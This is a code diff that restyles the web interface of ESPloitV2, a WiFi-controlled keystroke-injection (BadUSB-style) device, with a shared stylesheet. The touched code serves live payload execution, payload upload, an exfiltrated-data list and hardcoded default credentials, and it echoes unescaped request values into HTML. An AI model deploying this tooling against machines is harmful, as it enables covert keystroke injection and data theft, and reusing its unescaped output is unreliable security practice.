-    server.send(200, "text/html", String()+F("<html><body><b>ESPloit v")+version+F("</b> - WiFi controlled HID Keyboard Emulator<br><img width='86' height='86' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK0AAACtCAYAAADCr/9DAAAMlUlEQVR4nOydD+yVVf3Hz/VvWprYEDRQc5BzS2C5LJdbZs6BQAmBUFkjV1tNk5htZuKf/pCMyKmF2lrFLNCKQAUDM4otSWFjfUmJWlgtU0RTQQRT0Nv703O+7Ha53+99/pzzfM655/3aPjv9ft57ns9zzovzPc9zz3Oew5rNpiEkJg7RToCQolBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdBymnUAv0mg0jkExzP6fO5rN5m7NfHoNSlsSiHkoinMQExFnmEzS/ji67bN7Uexoia2IBxCPQOjXa0y7J2hw7UF+IN9xKMYjJiEmII6vWOULiNWIVYg16IudFetLAkqbA8h6EoobEZ82/v467Uf8SI6DPnna0zF6Ako7CHZk/TLiSsRRNR32FcRtiPkceTtDaTsAWY80majXIIYopfEi4ibEbeijV5VyCBJK2waElQupexHv087F8ijiYvTTDu1EQoHStgBhx6JYiRipnUsbTyImo682aycSAvxxwQJhL0ax3oQnrCA5rbc5Jg+lNf8T9moUyxFv1s5lECS35TbXpEl+egAJLkfxXe08CnIF+m2RdhJaJC0thP0QijUmvl8G5Z7uePTdWu1ENEhWWgg7GsUGo3dLqypyS+y96L+/aidSN0nOaSHsW012lyBWYQXJfaU9l6RIUlqwFHG6dhIOkHNYqp1E3SQnLUamD6O4SDsPh1xkzykZkprT2uWEj5lsKWEvIUsdz0xlmWNqI+1lpveEFeScLtNOoi6SGWkxysrC7G2IE7Vz8cR2xCj0517tRHyT0kg7x/SusIKc2xztJOogpZFW7meO0s7DM9vQn6O1k/BNEiMthJVbQ70urDDKnmtPk4S0JnumKxV6/lxTkXaidgI10vPn2vNzWvsz53OIw7VzqYl9iKHo113aifjC2+omyCKjuFwUjEPIA4J/lEBj7vF1zAE4z6QjrCDneh7ivjoPiv6W9b5jEPL0x/OIPpNdGDofFb1Ia1dQ3WUOfs5qF/7bF3AeP/Zx3AE4pcZjhUKt54w+nYXiFkT74h152mIW+nuby+M5n9MiyQ+a7F9ZpwcD5aTuwmd+gqhrDeuwmo4TErWcM/rwCMTPTLZfQ6fVZu9HbLZOOMOptEjuWBSLTdu2QB34BOLumsQdXsMxQsP7OaPvZBryc8T0Lh8VFxZbN5zgeqSV55dOzvnZaaYecTnSOsYKuwyRd3WZOOHs2TbX0p5T8PN1iEtpHdIywhZdDlnUjQFxLcu7SnxHxJXG+Bgm7Psd5yNsMdnVbEo846PSFmE/UuLrZdzoiGtpZaXR0BLf8yYu6pvlsr5UscLKRVcZYYXtrnJxPT3oq/Dduua4pCAtwlbZLKSKG/+Ha2nvRLxR4fsUNzAcCStO3OkmI8fS4k/xIygWVqyG4gaCFfanppqwwkLrhhOcrz0ocTtkIKQOXxdnpAstwk6pWNX9iGnox33Vs8pw/ouYTU5uON9fsSqOuEo4Fna6S2EFL0sTkeRrJpOu6qINilsztq3vMdWFlb6fZl1wirf1tC0jLsWNBNvGMsJOrViV9LnzEbYfr4vAKW48tIywQQsreH9yoUXceytWRXE90SLsRytWJX3sVVihlsdt7ElcYihucDgW9hLfwgq1PSNGccPDtuHdJiJhhdqfEXN4O+VlRBJ7V3lE9jZ7S8U6ViBm1CWsoPJgo0NxiS61CyuoPEJuT3KGyV7OQeJE+q52YQW1fQ/syc40FDdGpM9maggrqG7WwRE3StRG2H7Ud5ixC2JE3F9o50K6In00Q3sRk7q0gm0EmSpQ3HCRvpmpLawQhLRCi7jLtHMhByF9EoSwQnB7edkb3nIrped3/4uEVYgpoQgrBDPS9mMbJ8k3EQbK2pCEFYKTlpBuUFoSHVx0Up1/IeYV/M61iBEeckkCSlud5zHnK/R4NC42P2cobWk4PSDRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2l9j1oNBqTUUxAnIUY5jSjjGM81OmLsHbwc8/16O8veqh3B2ITYnWz2VxZ6Juya2LeAENM9gqfJuNA9BVpQ9uOfQHkHVKIU0Pytl/ukRb/2mQqIW+VPjfvdwjJiexLPAKOfQBSvtHtw0XmtFcZCkv8IW5dleeDRaS9slwuhOQml2O5pMWwfYLhhmnEPyOsa4OSd6R9e8VkCMlLV9fySrsVEdQW5qQnEce2dvtQLmlxRfcfk91TI8Qnm6xrg1LkQmy24Vu/iT/Erdl5PphbWvwL2IBibtmMCOnCXOtYVwqtPUCl80328+3TZbIipAPi0gTrVi4Krz1A5WsajcZp+J9jjb+1B2eb7B8H0Wc1YqOHevvXHmyGU68W+WKpBTP2IBuNn5OR+8KfMZQ2FJahv3+onUQroS5NfFk7AXKA3doJtENpSTcobU4obThQ2pxQ2nCgtDnZo50AOQClzQlH2nCgtDl5xnCBTgjIUwS7tJNoJ0hpm83mPhR/186DmCdsXwRFkNJa/qydADF/0k6gEyFL+xftBIjZop1AJ0KWliOtPpS2IJRWH04PCsLpgS5y5yDIgSNYaXHV+m8TaKMlwrY8j75oEKy0lge1E0iYtdoJDETo0v5KO4GEWaWdwECELu06RKFV7cQJexG/0U5iIIKWFnMqabyHtfNIkIdCnc8KQUtr4RShfoKdGggxSLvcZHuYknqQtn5AO4nBCF5a/JnahmKNdh4J8Xu0+XbtJAYjeGkti7QTSIiF2gl0IxZp5dn7v2knkQCy+dt92kl0Iwpp7Zbmt2vnkQALmvalECEThbQW2TDiFe0kepgnEUu0k8hDTNKOR7xJO4ke5uYQn1LoRBTSNhqN81Eslv+pnEovs1o7gbwELy2EHYNiBeII7Vx6nFVo6yheUxC0tGjEk002AhyrnUsCjEKsi0HcYKVF48nbIeVHhZO0c0kIEfe3aPug2zxIadFocsElb4c8QzuXBBltshE3WHGDk9a+zlRuvfDtkHqIuMGOuMFJC25FTNVOgph3mkzcE7UTaScoadFAV6O4QjsPcoAgxQ1GWjTMpShu0s6DHMTpJjBxg5AWDXKByX6mLfvjgaxNkFE66CV1EdMv7nDtRAR1adEQ40y20PvwCtXMaTabC0x28db1NZUJIusKllasIxxxZVGPVoBTTPYeqWaFWNhW59EmG7Wr1Fkk+kqcd1+N+a1HiGjyV2yRg/pkUBiu6o2isMfbBqjSgPdIZwxQv8yRdycsrTzFLFOmQ9uO/R0Hdct2ScOSkhYcZUeAKg23DnFkl+PI1e/GBKX9A+LMQY5/a8ziaggr8+gVFRvsccRxBY73WcRzCUgrf1muRRyeI4dbHBxvi4a4GtLeXrGhnkKMLHFcWcsgc7r9PSitvMH7+6bgXBPc7EjcE3pWWvCVig0k+/+PrZiD3K14uIekfQgxpkJ7fNtBDo/XKW6dwn6qYsO8hrjAYT4fRzwWsbQiykRHbfGtmMStS9gLrXRVGuWTHnN7MBJp5ccTmYue7aEdFjgQVwaBodFLC95tqt96uqaGPOXm+VyTXXmHJO1OxA8Q8qvhIZ7bYH4M4voW4VSTvROsSiPc4VvYDnmfhviSyZ6aeFZBWtlVR5ZnTjFdbut5OPdvOhI3192dMtGwiXqh0WhIp4+vUIUsBJ+KHF93lFIpcB4jUZxlQx4BOs5kdyOkfAr5TShY3y9RyGMtL9p4wWTb9W+SQH073WVfHOQ3z2QXzVVYgvO41EU+7XiTFicuslZ5wnMD4vxmtt0nqRn039dNNl2qwmT0n/MdGH0umKmykFv+PE6isHqg7a9D8bWK1UxykUs7PqV9R8nvyS9X45vZi0KIIuiDG1B8tUIV41zl0opPaY8p8R0ZWWWEfcJ1MqQc6IsbUdygnUcrPqV9tODn5WJrBhppo49kSHnQJzJNuK7EV/tc5yL4lLboK30u9zFpJ25A33zDFL8w89Kf3qTFSa5EsTLnx+fh89/zlQtxA/qoyK2wJb4GId/3aYei+J3Jfm3qhOzSdz1ymO8tCeIc9OvnTbZCbKBdLH+NmO7rfrPXZ8SQtNwJkA3kZAX9P1v+00sme0/VuRQ2PtBnd6B4j8lWmL1k/9/ycKksDJ+NuNDnDyReR9qDDtZoyEZyb0P8o1nngYk30Kfy7NmpiGfRpXtqOSbdIbGh/gg5IUWhtCQ6KC2JDkpLooPSkuigtCQ6KC2JDkpLooPSkuj4bwAAAP//z7m+jW7q4SgAAAAASUVORK5CYII='><br><i>by Corey Harding<br>www.LegacySecurityGroup.com / www.Exploit.Agency</i><br>-----<br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+F("<br>-----<br><a href=\"/livepayload\">Live Payload Mode</a> - <a href=\"/inputmode\">Input Mode</a> - <a href=\"/duckuino\">Duckuino Mode</a><br>-<br><a href=\"/listpayloads\">Choose Payload</a> - <a href=\"/uploadpayload\">Upload Payload</a><br>-<br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a> - <a href=\"/format\">Format File System</a><br>-<br><a href=\"/settings\">Configure ESPloit</a><br>-<br><a href=\"/firmware\">Upgrade ESPloit Firmware</a><br>-<br><a href=\"/help\">Help</a></body></html>"));
+    server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>ESPloit Dashboard</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit v")+version+F("</span><a href=\"/settings\">Settings</a><a href=\"/firmware\">Firmware</a><a href=\"/help\">Help</a></div><div class=\"card\"><div class=\"stat\"><span>Storage: <b>")+total+F("</b> B total</span><span><b>")+freespace+F("</b> B free</span><span><b>")+used+F("</b> B used</span></div></div><div class=\"grid\"><div class=\"gi\"><a href=\"/livepayload\"><div class=\"ico\">&#9889;</div>Live Payload<div class=\"lbl\">Real-time injection</div></a></div><div class=\"gi\"><a href=\"/inputmode\"><div class=\"ico\">&#9000;</div>Input Mode<div class=\"lbl\">Keyboard &amp; Mouse</div></a></div><div class=\"gi\"><a href=\"/duckuino\"><div class=\"ico\">&#128196;</div>Duckuino<div class=\"lbl\">Script converter</div></a></div><div class=\"gi\"><a href=\"/listpayloads\"><div class=\"ico\">&#128203;</div>Payloads<div class=\"lbl\">List &amp; manage</div></a></div><div class=\"gi\"><a href=\"/uploadpayload\"><div class=\"ico\">&#128228;</div>Upload<div class=\"lbl\">Upload payload</div></a></div><div class=\"gi\"><a href=\"/exfiltrate/list\"><div class=\"ico\">&#128230;</div>Exfiltration<div class=\"lbl\">View captured data</div></a></div><div class=\"gi\"><a href=\"/format\"><div class=\"ico\">&#128165;</div>Format<div class=\"lbl\">Erase file system</div></a></div><div class=\"gi\"><a href=\"/settings\"><div class=\"ico\">&#9881;</div>Settings<div class=\"lbl\">Configure device</div></a></div><div class=\"gi\"><a href=\"/firmware\"><div class=\"ico\">&#128260;</div>Firmware<div class=\"lbl\">Update firmware</div></a></div><div class=\"gi\"><a href=\"/help\"><div class=\"ico\">&#10067;</div>Help<div class=\"lbl\">Documentation</div></a></div></div><div class=\"card\" style=\"text-align:center\"><small>ESPloitV2 by Corey Harding &mdash; LegacySecurityGroup.com / Exploit.Agency</small></div></body></html>"));
   });
   if (esportalenabled==1){
   
@@ -829,6 +909,12 @@ void setup(void)
     });
   }
   
+  // Serve shared CSS theme from PROGMEM with 24-hour browser cache
+  server.on("/style.css", []() {
+    server.sendHeader("Cache-Control", "public, max-age=86400");
+    server.send_P(200, "text/css", CSS);
+  });
+
   server.on("/settings", handleSettings);
 
   server.on("/firmware", [](){
@@ -854,26 +940,29 @@ void setup(void)
       ardupdate="Something went wrong...";
     }
     
+    String fwPage = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Firmware</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Firmware</span><a href=\"/esploit\">Dashboard</a><a href=\"/help\">Help</a></div><div class=\"card\"><h2>Version Info</h2><table><tr><th>Component</th><th>Installed</th><th>Latest</th></tr><tr><td>32u4 Firmware</td><td>")+ardversion+F("</td><td>")+latestardversion+F("</td></tr><tr><td>ESP Firmware</td><td>")+version+F("</td><td>");
     if (version == latestversion && latestversion != "") {
-      server.send(200, "text/html", String()+F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><table><tr><th colspan=\"2\">ESPloit Firmware Info</th></tr><tr><td>32u4 Version Installed:</td><td>")+ardversion+F("</td></tr><tr><td>Latest 32u4 Version:</td><td>")+latestardversion+F("</td></tr><tr><td colspan=\"2\" style=\"border-bottom: 1px solid #000;\">")+ardupdate+F("</td></tr><tr><td>ESP Version Installed:</td><td>")+version+F("</td></tr><tr><td>Latest ESP Version:</td><td>")+latestversion+F("</td></tr></table>ESP Firmware is up to date<br><br><iframe name=\"iframe\" style =\"border: 0;\" src=\"http://")+local_IPstr+":1337/update\"><a href=\"http://"+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe><br><br>Manually install firmware:<br>Download the latest version from: <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">https://github.com/exploitagency/ESPloitV2</a><br>\"ESP_Code.ino.generic.bin\" can be found on the GitHub releases page.<br>Click \"Browse...\" and \"Update\" above to update the ESP portion.<br>Manually update the 32u4 portion using the Arduino IDE.<br>More info can be found on the <a href=\"/help\" target=\"_blank\">help page</a>.</body></html>"));
+      fwPage += latestversion+F("</td></tr></table><div class=\"success\">")+ardupdate+F("<br>ESP Firmware is up to date.</div></div>");
     }
     else if (version != latestversion && latestversion != "") {
-      server.send(200, "text/html", String()+F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><table><tr><th colspan=\"2\">ESPloit Firmware Info</th></tr><tr><td>32u4 Version Installed:</td><td>")+ardversion+F("</td></tr><tr><td>Latest 32u4 Version:</td><td>")+latestardversion+F("</td></tr><tr><td colspan=\"2\" style=\"border-bottom: 1px solid #000;\">")+ardupdate+F("</td></tr><tr><td>ESP Version Installed:</td><td>")+version+F("</td></tr><tr><td>Latest ESP Version:</td><td>")+latestversion+F("</td></tr></table><a href=\"/autoupdatefirmware\" target=\"iframe\">Click to automatically update firmware</a><br><br><iframe name=\"iframe\" style =\"border: 0;\" src=\"http://")+local_IPstr+":1337/update\"><a href=\"http://"+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe><br><br>Manually install firmware:<br>Download the latest version from: <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">https://github.com/exploitagency/ESPloitV2</a><br>\"ESP_Code.ino.generic.bin\" can be found on the GitHub releases page.<br>Click \"Browse...\" and \"Update\" above to update the ESP portion.<br>Manually update the 32u4 portion using the Arduino IDE.<br>More info can be found on the <a href=\"/help\" target=\"_blank\">help page</a>.</body></html>"));
+      fwPage += latestversion+F("</td></tr></table><div class=\"warn\">")+ardupdate+F("<br>ESP update available.</div><a href=\"/autoupdatefirmware\" target=\"iframe\" class=\"btn btn-p\">Auto-Update ESP Firmware</a></div>");
     }
     else if (httpCode < 0) {
-      server.send(200, "text/html", String()+F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><table><tr><th colspan=\"2\">ESPloit Firmware Info</th></tr><tr><td>32u4 Version Installed:</td><td>")+ardversion+F("</td></tr><tr><td>Latest 32u4 Version:</td><td>")+latestardversion+F("</td></tr><tr><td colspan=\"2\" style=\"border-bottom: 1px solid #000;\">")+ardupdate+F("</td></tr><tr><td>ESP Version Installed:</td><td>")+version+F("</td></tr><tr><td>Latest ESP Version:</td><td>?</td></tr></table>Could not connect to the update server<br><br><iframe name=\"iframe\" style =\"border: 0;\" src=\"http://")+local_IPstr+":1337/update\"><a href=\"http://"+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe><br><br>Manually install firmware:<br>Download the latest version from: <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">https://github.com/exploitagency/ESPloitV2</a><br>\"ESP_Code.ino.generic.bin\" can be found on the GitHub releases page.<br>Click \"Browse...\" and \"Update\" above to update the ESP portion.<br>Manually update the 32u4 portion using the Arduino IDE.<br>More info can be found on the <a href=\"/help\" target=\"_blank\">help page</a>.</body></html>"));
+      fwPage += F("?</td></tr></table><div class=\"warn\">")+ardupdate+F("<br>Could not connect to update server.</div></div>");
     }
+    fwPage += String()+F("<div class=\"card\"><h2>Manual Upload</h2><iframe name=\"iframe\" style=\"border:0;width:100%;height:80px\" src=\"http://")+local_IPstr+F(":1337/update\"></iframe><small>Download latest from <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">GitHub</a>. Upload <code>ESP_Code.ino.generic.bin</code> above. Update 32u4 via Arduino IDE. See <a href=\"/help\">help</a>.</small></div></body></html>");
+    server.send(200, "text/html", fwPage);
   });
 
   server.on("/autoupdatefirmware", [](){
     if(!server.authenticate(update_username, update_password))
     return server.requestAuthentication();
-    server.send(200, "text/html", String()+F("<html><body>Upgrading firmware...</body></html>"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"warn\">Upgrading firmware... Device will reboot automatically.</div></body></html>"));
     ESPhttpUpdate.update("http://legacysecuritygroup.com/esploit.php?tag=" + version);
   });
   
   server.on("/livepayload", [](){
-    server.send(200, "text/html", String()+F("<html><body style=\"height: 100%;\"><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/uploadpayload\">Upload Payload</a><br><br><FORM action=\"/runlivepayload\" method=\"post\" id=\"live\" target=\"iframe\">Payload: <br><textarea style =\"width: 100%;\" form=\"live\" rows=\"4\" cols=\"50\" name=\"livepayload\"></textarea><br><br><INPUT type=\"radio\" name=\"livepayloadpresent\" value=\"1\" hidden=\"1\" checked=\"checked\"><INPUT type=\"submit\" value=\"Run Payload\"></form><br><hr><br><iframe style =\"visibility: hidden;\" src=\"http://")+local_IPstr+"/runlivepayload\" name=\"iframe\"></iframe></body></html>");
+    server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Live Payload</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Live Payload</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a><a href=\"/uploadpayload\">Upload</a></div><div class=\"card\"><h2>Execute Live Payload</h2><FORM action=\"/runlivepayload\" method=\"post\" id=\"live\" target=\"iframe\"><label>ESPloit Script</label><textarea form=\"live\" name=\"livepayload\" rows=\"8\" placeholder=\"Enter payload script...\"></textarea><br><INPUT type=\"radio\" name=\"livepayloadpresent\" value=\"1\" hidden=\"1\" checked=\"checked\"><div class=\"flex mt\"><INPUT type=\"submit\" value=\"Run Payload\"> <a href=\"/duckuino\" class=\"btn\">Duckuino Converter</a></div></FORM></div><iframe name=\"iframe\" src=\"http://")+local_IPstr+F("/runlivepayload\"></iframe></body></html>"));
   });
 
 
@@ -881,7 +970,7 @@ void setup(void)
     String livepayload;
     livepayload += server.arg("livepayload");
     if (server.hasArg("livepayloadpresent")) {
-      server.send(200, "text/html", "<pre>Running live payload: <br>"+livepayload+"</pre>");
+      server.send(200, "text/html", "<!DOCTYPE HTML><html><head><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"success\">Running live payload...</div><pre>"+livepayload+"</pre></body></html>");
       char* splitlines;
       int payloadlen = livepayload.length()+1;
       char request[payloadlen];
@@ -946,18 +1035,18 @@ void setup(void)
       return 0;
     }
     else {
-      server.send(200, "text/html", F("Type or Paste a payload and click \"Run Payload\"."));
+      server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"info\">Type or paste a payload and click &quot;Run Payload&quot;.</div></body></html>"));
     }
   });
 
   server.on("/restoredefaults", [](){
-    server.send(200, "text/html", F("<html><body>This will restore the device to the default configuration.<br><br>Are you sure?<br><br><a href=\"/restoredefaults/yes\">YES</a> - <a href=\"/esploit\">NO</a></body></html>"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Restore Defaults</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><div class=\"warn\">This will restore the device to the default configuration. All settings will be lost.</div><div class=\"flex mt\"><a href=\"/restoredefaults/yes\" class=\"btn btn-d\">Yes, Restore Defaults</a> <a href=\"/esploit\" class=\"btn\">Cancel</a></div></div></body></html>"));
   });
 
   server.on("/restoredefaults/yes", [](){
     if(!server.authenticate(update_username, update_password))
       return server.requestAuthentication();
-    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Network<br>---<br>SSID: <b>Exploit</b> PASS: <b>DotAgency</b><br><br>Administration<br>---<br>USER: <b>admin</b> PASS: <b>hacktheplanet</b>"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"success\">Defaults restored. Device rebooting...</div><div class=\"card\"><h2>Default Credentials</h2><table><tr><th>Setting</th><th>Value</th></tr><tr><td>SSID</td><td><b>Exploit</b></td></tr><tr><td>WiFi Password</td><td><b>DotAgency</b></td></tr><tr><td>Admin User</td><td><b>admin</b></td></tr><tr><td>Admin Password</td><td><b>hacktheplanet</b></td></tr></table></div></body></html>"));
     loadDefaults();
     ESP.restart();
   });
@@ -965,7 +1054,7 @@ void setup(void)
   server.on("/deletepayload", [](){
     String deletepayload;
     deletepayload += server.arg(0);
-    server.send(200, "text/html", "<html><body>This will delete the file: "+deletepayload+".<br><br>Are you sure?<br><br><a href=\"/deletepayload/yes?payload="+deletepayload+"\">YES</a> - <a href=\"/esploit\">NO</a></body></html>");
+    server.send(200, "text/html", "<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Delete File</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><div class=\"warn\">This will permanently delete: <code>"+deletepayload+"</code></div><div class=\"flex mt\"><a href=\"/deletepayload/yes?payload="+deletepayload+"\" class=\"btn btn-d\">Yes, Delete</a> <a href=\"/esploit\" class=\"btn\">Cancel</a></div></div></body></html>");
   });
 
   server.on("/deletepayload/yes", [](){
@@ -973,13 +1062,13 @@ void setup(void)
       return server.requestAuthentication();
     String deletepayload;
     deletepayload += server.arg(0);
-    if (deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br>Deleting file: ")+deletepayload);
-    if (!deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br><br>Deleting file: ")+deletepayload);
+    if (deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a></div><div class=\"success\">Deleted: <code>")+deletepayload+F("</code></div></body></html>"));
+    if (!deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a><a href=\"/exfiltrate/list\">Exfiltrated Data</a></div><div class=\"success\">Deleted: <code>")+deletepayload+F("</code></div></body></html>"));
     SPIFFS.remove(deletepayload);
   });
 
   server.on("/format", [](){
-    server.send(200, "text/html", F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br>This will reformat the SPIFFS File System.<br><br>Are you sure?<br><br><a href=\"/format/yes\">YES</a> - <a href=\"/esploit\">NO</a></body></html>"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Format SPIFFS</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><div class=\"warn\">This will reformat the SPIFFS file system. <b>All payloads and exfiltrated data will be permanently deleted.</b></div><div class=\"flex mt\"><a href=\"/format/yes\" class=\"btn btn-d\">Yes, Format</a> <a href=\"/esploit\" class=\"btn\">Cancel</a></div></div></body></html>"));
   });
 
   server.on("/exfiltrate", [](){
@@ -997,14 +1086,14 @@ void setup(void)
   server.on("/reboot", [](){
     if(!server.authenticate(update_username, update_password))
     return server.requestAuthentication();
-    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Rebooting ESPloit..."));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"warn\">Rebooting ESPloit... Please wait and reconnect.</div></body></html>"));
     ESP.restart();
   });
   
   server.on("/format/yes", [](){
     if(!server.authenticate(update_username, update_password))
       return server.requestAuthentication();
-    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Formatting file system: This may take up to 90 seconds"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"warn\">Formatting file system... This may take up to 90 seconds.</div></body></html>"));
 //    Serial.print("Formatting file system...");
     SPIFFS.format();
 //    Serial.println(" Success");
@@ -1012,7 +1101,7 @@ void setup(void)
   });
     
   server.on("/uploadpayload", []() {
-    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/livepayload\">Live Payload Mode</a><br><br><b>Upload Payload:</b><br><br><form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='upload' multiple><input type='submit' value='Upload'></form>"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Upload Payload</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Upload Payload</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a><a href=\"/livepayload\">Live Mode</a></div><div class=\"card\"><h2>Upload Payload File</h2><form method=\"POST\" action=\"/upload\" enctype=\"multipart/form-data\"><div class=\"mb\"><input type=\"file\" name=\"upload\" multiple></div><input type=\"submit\" value=\"Upload\"></form></div></body></html>"));
   });
     
   server.on("/listpayloads", ListPayloads);
@@ -1020,7 +1109,7 @@ void setup(void)
   server.onFileUpload(handleFileUpload);
     
   server.on("/upload", HTTP_POST, []() {
-    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Upload Successful!<br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/uploadpayload\">Upload Another Payload</a>"));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"success\">Upload successful!</div><div class=\"flex\"><a href=\"/listpayloads\" class=\"btn btn-p\">View Payloads</a> <a href=\"/uploadpayload\" class=\"btn\">Upload Another</a></div></body></html>"));
   });
 
   server.on("/help", []() {
@@ -1044,7 +1133,7 @@ void setup(void)
   server.on("/dopayload", [](){
     String dopayload;
     dopayload += server.arg(0);
-    server.send(200, "text/html", String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><pre>Running payload: ")+dopayload+F("</pre><br>This may take a while to complete..."));
+    server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a></div><div class=\"success\">Running payload: <code>")+dopayload+F("</code></div><div class=\"info\">This may take a while to complete...</div></body></html>"));
 //    Serial.println("Running payaload: "+dopayload);
     File f = SPIFFS.open(dopayload, "r");
     int defaultdelay = DelayLength;
@@ -1135,6 +1224,10 @@ void setup(void)
   
 }
 
+/* loop() - Main event loop
+ * Handles: FTP server, HTTP requests, DNS (ESPortal), serial commands from 32u4
+ * Serial protocol: "Command:Data\n" - supports ResetDefaultConfig, Version,
+ * SerialEXFIL (saves to /SerialEXFIL.txt), and BlinkLED */
 void loop() {
   if (ftpenabled==1){
     ftpSrv.handleFTP();
